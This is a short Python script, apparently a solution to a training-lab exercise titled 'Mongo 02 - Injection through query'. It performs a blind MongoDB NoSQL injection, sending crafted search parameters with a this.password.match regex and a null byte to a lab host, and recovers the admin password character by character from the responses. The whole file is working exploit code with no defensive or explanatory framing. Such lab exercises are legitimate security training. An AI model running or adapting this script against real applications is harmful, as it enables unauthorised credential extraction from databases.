#Mongo 02 - Injection through query

import re
import requests
import urllib2

charset = ("a","b","c","d","e","f", "0","1","2","3","4","5","6","7","8","9","-")
key="" 
count=0
print(len(charset))
#while(len(key) < 36):
for j in range(0,36):
    for i in range(len(charset)):
        print("Trying {} char at {} position".format(charset[i],j+1))
        var = ""
        var = charset[i]
        print("Trying URL + {}\n".format(var))
        url = "http://blahblahblah.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/^{}/)%00".format(key+var)
        html_content = urllib2.urlopen(url).read()
        matches = re.findall('>admin<',html_content)
        if (len(matches)):
            key= key + var
            print("key {} matched, trying next\n".format(key))
            count = count + 1
            break

print("The key is:\n"+key)